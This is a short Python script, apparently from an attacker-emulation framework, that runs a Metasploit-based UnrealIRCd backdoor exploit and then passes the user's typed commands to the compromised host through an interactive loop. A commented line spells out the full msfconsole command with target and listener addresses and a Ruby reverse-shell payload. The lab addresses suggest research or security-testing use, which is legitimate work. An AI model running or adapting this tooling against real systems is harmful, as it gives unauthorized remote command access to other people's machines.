#! /usr/bin/python3

#https://stackoverflow.com/questions/16602513/preventing-linewrap-when-using-pexpect-bash

import pexpect

#spawn = pexpect.spawn("/bin/bash")

spawn = pexpect.spawn("/root/Documents/attacker-modeling-framework/initial_intrusion/msfUnrealIRCd_backdoor.sh")

#spawn = pexpect.spawn('/usr/bin/msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor;set rhost 10.0.2.9;set rport 6697;set payload cmd/unix/reverse_ruby;set lhost 10.0.2.8;set lport 4567; run;"')

spawn.sendline("export PS1=\"\\$ \"\n".encode())
spawn.readline()

temp = spawn.readline().decode()
temp = temp[:temp.find("$")] + "\n" + "$ "

while (True):
    input_str = input(temp)
    spawn.sendline((input_str + "\n").encode())
    if (input_str == "exit"):
        break
    temp = ""
    while (temp.find("$") == -1):
        temp += spawn.readline().decode()
    #print(temp)
    temp = ""
    while (temp.find("$") == -1):
        temp += spawn.readline().decode()
    temp = temp[:temp.find("$")] + "\n" + "$ "

